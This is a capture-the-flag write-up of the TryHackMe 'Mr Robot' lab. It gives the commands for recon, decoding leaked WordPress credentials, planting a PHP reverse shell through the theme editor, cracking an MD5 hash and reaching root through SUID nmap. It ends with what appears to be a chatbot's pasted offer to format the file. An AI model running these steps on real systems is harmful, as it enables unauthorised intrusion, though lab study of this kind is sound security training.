# Mr Robot — TryHackMe (GitHub Writeup)
**Author:** Koushiq Murad
**Room:** Mr Robot (TryHackMe)
**Difficulty:** Medium
**Machine type:** CTF / Linux

---

## TL;DR
This report documents a full compromise of the **Mr Robot** TryHackMe box.  
Short chain: **Recon (nmap + gobuster) → discover `robots.txt` & hidden files → decode credentials (Base64) → login to WordPress → edit theme to get a PHP reverse shell → enumerate, find hashed password → crack to `robot` → read user flag → discover SUID `nmap` → abuse via GTFOBins to spawn a root shell → read root flag.  

> **Flags/keys are intentionally omitted from this writeup.** Replace placeholders below with the actual flags you captured when you submit to TryHackMe or push to GitHub.

---

## Environment
- Lab: TryHackMe — **Mr Robot**
- Target IP: `10.10.X.X` *(replace with the machine IP from your lab session)*
- Attacker: Kali / local Linux workstation
- Date of testing: *(your date here)*

---

## Tools used
`nmap`, `gobuster` (or `feroxbuster`), `curl`, web browser, `base64` (or online decoder), `nc` (netcat), `python3` (for TTY), `john`/online crack engines (CrackStation), `find`, `linpeas`/`LinEnum` (optional), `gtfobins` (research).

---

## Objective
Capture three keys (key1, key2, key3). Documented here are the commands, rationale, and artifacts you should include in a GitHub-ready report. This writeup is authored as **Koushiq Murad**.

---

## Recon & Enumeration

1. **Initial full port/service scan**
```bash
# aggressive scan with scripts and version detection, save output
nmap -sC -sV -p- -T4 -oA nmap/initial 10.10.X.X
```
Look for open ports (web ports 80/443 are expected).

2. **Targeted scan**
```bash
nmap -sC -sV -p22,80,443 -oA nmap/targeted 10.10.X.X
```
If SSH shows as closed in a generic scan, re-check with targeted scan.

3. **Web content discovery**
```bash
gobuster dir -u http://10.10.X.X -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 50 -o gobuster/root.txt
# or feroxbuster if preferred
```
From enumeration we discover paths such as `/robots.txt`, `/license` (or `readme`), and `/wp-login.php`.

---

## Finding Key 1 & Credentials
1. **Check robots.txt**
```bash
curl -sS http://10.10.X.X/robots.txt
```
Robots pointed to a file (example: `key-1-of-3.txt`). Download it and note it is one of the keys.

2. **Check other discovered files**
- `license`, `readme`, or similar files sometimes contain Base64-encoded strings. Copy the Base64 blob and decode:
```bash
echo 'BASE64_STRING' | base64 -d
```
That decoded output provided WordPress credentials (username and password). Keep those safe.

> **Captured:** Key 1 was found directly via web enumeration (do **not** publish the key here).

---

## Foothold — WordPress Editor → Reverse Shell

1. **Login to WordPress**  
Visit `http://10.10.X.X/wp-login.php` and authenticate with the decoded credentials found earlier.

2. **Edit theme file**  
Navigate to **Appearance → Theme File Editor** (or the page editor) to find an editable PHP template (commonly `404.php` or another page template). Because the user role had editor privileges, I was able to modify a theme file.

3. **Prepare listener on attacker**
```bash
nc -lvnp 9010
```

4. **Inject reverse shell and trigger page**  
Paste a PHP payload into the editable page and save. Trigger the page in a browser to execute it and receive a shell on the listener.

5. **Upgrade the shell**
Once you get a basic shell, upgrade TTY:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then Ctrl-Z, stty raw -echo, fg, reset terminal as usual
```

**Proof/artifacts to include** (screenshots):
- Gobuster output showing discovered paths
- robots.txt and the file showing key1 (or a screenshot of curl output)
- WordPress admin/Appearance → Theme Editor screen before/after edit
- Netcat listener showing the incoming connection and a sample `id` output from the web shell

---

## Local Enumeration & Capturing Key 2

1. **Basic enumeration (from web shell)**
```bash
id
uname -a
pwd
ls -la
ls -la /home
cat /home/robot/* 2>/dev/null
```
Look for unusual files in `/home/robot/` — there was a file containing an MD5 hash (a saved password).

2. **Crack the hash**
- Quick approach: use an online rainbow table (CrackStation) for fast results.
- Local approach: save the hash to `hash.txt` and crack with John:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=raw-md5
```
Cracked password allowed switching user to `robot`:
```bash
su robot
# enter cracked password
```

3. **Read user flag**
```bash
cat /home/robot/user.txt
# copy key2 into TryHackMe (do not publish it here)
```

**Proof/artifacts to include**:
- The hash file (or screenshot of it)
- CrackStation / John output (screenshot)
- `su robot` and `id` output as robot
- `cat /home/robot/user.txt` output (screenshot)

---

## Privilege Escalation → Root (SUID `nmap` abuse)

1. **Search for SUID/SGID files**  
Note: legacy `-perm +6000` may not work — use the portable syntax:
```bash
# recommended: find files with any setuid/setgid bits
sudo find / -type f -perm /6000 2>/dev/null | grep '/bin/'
# or narrow to common binary dirs
sudo find /bin /usr/bin /sbin /usr/sbin -type f -perm /6000 2>/dev/null
```

2. **Identify unusual SUID binary**  
From enumeration, `nmap` was present with the SUID bit set — this is unusual and likely abusable. Use GTFOBins to research abuse vectors for `nmap`.

3. **Abuse nmap to spawn a root shell**
```bash
nmap --interactive
# inside nmap prompt:
!sh
# now you should be root
whoami
# should print: root
```

4. **Read root flag**
```bash
cat /root/root.txt
# copy key3 into TryHackMe (do not publish it here)
```

**Proof/artifacts to include**:
- Output of `sudo find / -type f -perm /6000` showing `nmap`
- GTFOBins entry screenshot (showing the method used)
- Running `nmap --interactive` and then `!sh` resulting in `whoami` → `root`
- `cat /root/root.txt` output (screenshot)

---

## Clean, Reproducible Command Summary
(Use these in your notes or as part of a script for documentation — **do not** run on systems you do not own or have permission to test.)

```bash
# Recon
nmap -sC -sV -p- -T4 -oA nmap/initial 10.10.X.X
nmap -sC -sV -p22,80,443 -oA nmap/targeted 10.10.X.X

# Web enumeration
gobuster dir -u http://10.10.X.X -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 50 -o gobuster/root.txt
curl -sS http://10.10.X.X/robots.txt
curl -sS http://10.10.X.X/key-1-of-3.txt

# decode base64 if needed
echo 'BASE64_STRING' | base64 -d

# start listener for reverse shell
nc -lvnp 9010

# after getting shell, upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'

# crack MD5 (local)
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=raw-md5

# search for SUID/SGID
sudo find / -type f -perm /6000 2>/dev/null | grep '/bin/'

# abuse nmap if SUID
nmap --interactive
!sh

# read flags
cat /home/robot/user.txt
cat /root/root.txt
```

---

## Lessons Learned / Notes
- Always check `robots.txt`, hidden files and theme files — low-hanging fruit often contains keys or credentials in CTFs.
- `-perm +6000` is legacy; use `-perm /6000` or `-perm -6000` depending on whether you need any or all bits. This is a common source of confusion in privilege enumeration.
- WordPress editor access is high impact: if the role can edit theme/plugin PHP files, you can often achieve code execution.
- Quick hash-checks against online rainbow tables save time; use John/Hashcat for offline brute-force when needed.
- GTFOBins is invaluable to check for abuse techniques for SUID binaries.

---

## Recommended artifacts (what to push to GitHub)
Include the following in your repo (safely):
- `nmap` output (initial + targeted) — `nmap/initial.nmap`, `nmap/targeted.nmap`
- `gobuster` output — `gobuster/root.txt`
- `robots.txt` (screenshot or saved file) — redact keys if you keep a public repo
- A screenshot of WordPress Theme Editor before/after editing
- `nc` listener output showing incoming reverse shell (screenshot)
- `su robot` and `whoami` outputs (as robot)
- `sudo find / -type f -perm /6000` output showing `nmap`
- Screenshot of root shell and `cat /root/root.txt` — **do not post actual flags publicly**; instead show blurred/redacted flag images if you're publishing the repo

---

## Closing / Final Notes
This box is a great medium-level exercise that ties together web enumeration, credential discovery, WordPress exploitation, local hash cracking, and classic Linux privilege escalation via SUID abuse. The steps and commands above were used to capture all three keys during my session — the flags are intentionally **not** included here.

If you want, I will:
- produce a polished `Mr_Robot_Writeup.md` file (ready to drop into your GitHub repo), including redacted screenshots and a small `proofs/` folder with images (I can generate the markdown and you can paste your screenshots), **or**
- insert your captured flags and screenshots into this writeup and export a final `.md` file you can download.

Great job — keep these notes as a template for future CTF writeups.

— **Koushiq Murad**
